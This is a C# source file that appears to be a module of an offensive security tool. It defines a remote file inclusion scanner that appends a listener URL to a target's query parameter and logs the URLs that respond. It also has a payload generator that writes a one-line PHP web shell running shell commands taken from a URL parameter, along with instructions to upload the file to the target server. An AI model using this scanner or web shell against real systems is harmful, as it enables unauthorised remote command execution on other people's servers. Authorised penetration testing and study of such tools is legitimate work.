using File = WhoAreYou.Helpers.File;

namespace WhoAreYou.Modules;

internal class Rfi
{
    private static readonly HttpClient Client = new();
    private readonly string _url;

    /// <param name="url">
    ///     The base URL which needs to have an empty parameter like `https://????.com?id=` (note the empty value after `=`).
    /// </param>
    public Rfi(string url)
    {
        if (string.IsNullOrWhiteSpace(url))
            throw new ArgumentException("URL cannot be null or empty.", nameof(url));

        _url = url;
    }

    /// <param name="listenerUrl">The URL of the listener.</param>
    /// <param name="expectedResponse">The expected response from the listener.</param>
    public async Task ScanRfi(string listenerUrl, string expectedResponse)
    {
        var rfiLink = File.GenerateFileName("RFI Vuln");
        var urlToTest = _url + listenerUrl;

        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine($"Testing: {urlToTest}");

        try
        {
            var response = await Client.GetAsync(urlToTest);

            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                if (content.Contains(expectedResponse))
                {
                    File.AppendToFile(rfiLink, urlToTest);
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"Potential RFI vulnerability found at: {urlToTest}");
                    Console.ReadKey();
                }
            }
            else
            {
                Console.WriteLine($"Failed to access {urlToTest} (Status Code: {response.StatusCode})");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error occurred while testing {urlToTest}: {ex.Message}");
        }
    }

    public static void RfiPayload()
    {
        var payloadFile = File.GenerateFileName("RFI Payload example");
        List<string> payload =
        [
            "<?php echo shell_exec($_GET['cmd']); ?>", "",
            "Upload this file to the target server and access it via the URL. as .txt preferably"
        ];

        File.WriteToFile(payloadFile, payload);
    }
}